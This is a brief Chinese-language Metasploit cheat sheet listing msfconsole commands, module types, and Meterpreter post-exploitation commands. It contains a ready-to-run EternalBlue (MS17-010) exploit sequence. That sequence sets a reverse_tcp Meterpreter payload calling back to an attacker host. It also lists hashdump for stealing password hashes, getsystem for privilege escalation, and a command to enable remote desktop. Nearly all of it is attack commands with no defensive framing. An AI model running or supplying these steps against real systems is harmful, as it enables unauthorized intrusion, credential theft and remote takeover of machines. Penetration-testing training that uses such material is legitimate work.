# Metasploit渗透框架

## 基本命令

```bash
msfconsole
search exploit_name
use exploit_path
show options
set PAYLOAD payload_name
set RHOST target_ip
exploit
```

## 模块类型

| 模块 | 说明 |
|------|------|
| auxiliary | 辅助模块（扫描、嗅探） |
| exploit | 漏洞利用模块 |
| payload | 攻击载荷 |
| post | 后渗透模块 |
| encoder | 编码器 |
| nop | 空操作生成器 |

## 漏洞利用示例

### MS17-010（永恒之蓝）
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit
```

## Meterpreter常用命令

```bash
# 获取系统信息
sysinfo

# 获取密码哈希
hashdump

# 截图
screenshot

# 开启远程桌面
run getgui -e

# 权限提升
getsystem
```'